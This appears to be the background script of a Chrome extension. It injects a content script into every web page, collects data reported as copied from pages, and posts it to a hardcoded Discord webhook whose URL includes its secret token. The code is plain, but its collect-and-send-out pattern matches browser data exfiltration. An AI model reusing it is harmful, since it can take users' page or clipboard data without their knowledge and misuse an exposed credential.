let current_data = []
const sendMessage =() => {
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/822156124916678676/3EmfzC8BtjHYrwScmB1way_wNNeqa37bM7rwbjODiuraLq9VSdHBM6bvJMiav0Dl_Fos");

    request.setRequestHeader('Content-type', 'application/json');

    var params = {
      username: "WZDM Chrome Extension",
      avatar_url: "",
      content: current_data.join()
    }

    request.send(JSON.stringify(params));
  }
  
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (/^http/.test(tab.url) && changeInfo.status === 'complete') {
        chrome.tabs.executeScript(tabId, { file: './scripts/foreground.js' }, () => {
            console.log('The foreground script has been injected.');
        });
    }
});


chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.message === 'add_copied_data') {
        current_data.push(request.payload);
        chrome.storage.sync.set({ 'current_data': current_data });
    } else if (request.message === 'send_all_data') {
        console.log('All of the current data: '+current_data);
        sendMessage()
        current_data = [];
        chrome.storage.sync.set({ 'current_data': current_data });
        sendResponse({ message: 'data_sent' })
    }
});